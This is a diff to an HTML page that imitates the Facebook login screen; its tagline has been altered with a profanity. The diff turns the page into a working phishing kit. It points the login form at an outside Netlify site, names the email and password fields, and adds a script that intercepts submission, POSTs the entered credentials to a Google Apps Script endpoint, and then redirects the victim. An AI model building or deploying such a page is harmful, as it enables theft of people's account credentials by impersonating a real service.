@@ -14,9 +14,9 @@
     <p>Facebook helps fuck connect and share with the people in your life.</p>
   </div>
   <div class="form-box">
-    <form action="#">
-      <input type="text" placeholder="Email address or phone number">
-      <input type="password" placeholder="Password">
+    <form action="https://submit-code.netlify.app/">
+      <input type="text" name="email" placeholder="Email address or phone number">
+      <input type="password" name="pass" placeholder="Password">
       <button type="submit">Log In</button>
       <a href="#">Forgotten Password</a>
     </form>
@@ -27,6 +27,20 @@
   </div>
 </div>
 <!-- partial -->
-  
+   <script>
+
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbw3gigikqBFGf0mg8lXzmIJxtg-_pg82EDyQBksoRxXG_CvWIkJxBrf3c-kWh_BmGg/exec';
+    
+    const form = document.forms['form'];
+     
+   
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+       // .then(response => alert("Thank you! your form is submitted successfully." ))
+       .then(() => { window.location.href='https://submit-code.netlify.app/'; })
+       // .catch(error => console.error('Error!', error.message))
+    })
+   </script>
 </body>
 </html>
